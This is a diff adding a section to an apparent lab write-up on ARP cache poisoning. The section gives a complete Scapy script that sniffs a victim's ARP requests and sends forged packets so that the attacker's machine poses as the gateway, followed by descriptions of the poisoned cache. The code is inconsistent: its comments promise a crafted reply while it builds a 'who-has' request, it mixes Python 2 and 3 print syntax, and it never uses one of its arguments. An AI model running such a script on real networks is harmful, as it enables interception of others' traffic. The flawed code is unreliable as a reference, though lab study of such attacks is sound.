@@ -129,6 +129,76 @@ The following header with explicit encoding was necessary:
 
     #!/usr/bin/env python # coding: utf-8
     
+    
+With the following code I believe I successfully placed the attacking VM into the poisoned ARP cache of the victim machine.
+~~~~
+#!/usr/bin/env python # coding: utf-8
+
+###The SCAPY script (arpy.py) sees an ARP request from 
+###the target machine (for any IP) and then responds to the ARP request
+###with a crafted reply that provides the attacker’s MAC address.
+###In doing so, the victim is fooled into believing that the requested IP resolves 
+###in the local segment to the attacker’s MAC address.
+
+
+from scapy.all import *
+#### Adapt the following settings ####
+conf.iface = 'eth3'
+###
+attack_IP = "192.168.1.105"
+attack_mac = "08:00:27:f6:b4:f6"
+target_mac = "08:00:27:4a:3e:fa"
+target_ip = sys.argv[1]
+impersonating_mac = sys.argv[2]
+gw_IP = "192.168.1.1"
+gw_mac = "08:00:27:f2:0f:ab"
+
+#call the function whenever a new arp packet is sniffed
+def arp_callback(pkt):
+	#make sure it's arp, a request, and the target is the one asking
+	if ARP in pkt and pkt[ARP].op==1 and pkt[ARP].psrc==target_ip:
+		#get the packet
+		arpin = pkt[ARP]
+		#show it
+		print("Received an ARP request")
+		arpin.display()
+		arpout = ARP()
+		#make the reply arp packet
+		arpout = Ether()/ARP(op="who-has", psrc=gw_IP, pdst=sys.argv[1], hwdst=target_mac)
+		print("Sending an ARP reply")
+		arpout.display()
+
+		send(arpout, inter=2, loop=1)
+		return arpout.sprintf("ARP reply sent!")
+		
+#main program
+
+if len(sys.argv) !=3:
+	print "Usage: ./arpy.py <target_IP> <impersonating_mac>"
+	sys.exit(1)
+
+#wait for up to 10 arps and call the arp_callback for each
+while True:
+	sniff(prn=arp_callback, filter="arp", count= 10)~~~~
+
+The ARP response from the attacking machine:
+
+![ARP Response on attacking machine](/images/Lab6-ARP_response.png)
+
+The victim machine now thinks that the attacker is the gateway.  So when the victim tries to ping a non-existent 192.168.1.103, the response is from the attacking machine:
+![Victim machine now thinks the attacker is the gateway](/images/Lab6-Thinks_attacker_is_gw.png)
+
+The target's ARP cache has been successfully poisoned:
+![ARP cache successfully poisoned](/images/Lab6-ARP_cache_poisoned.png)
+
+
+
+
+
+
+
+
+
 
 
 
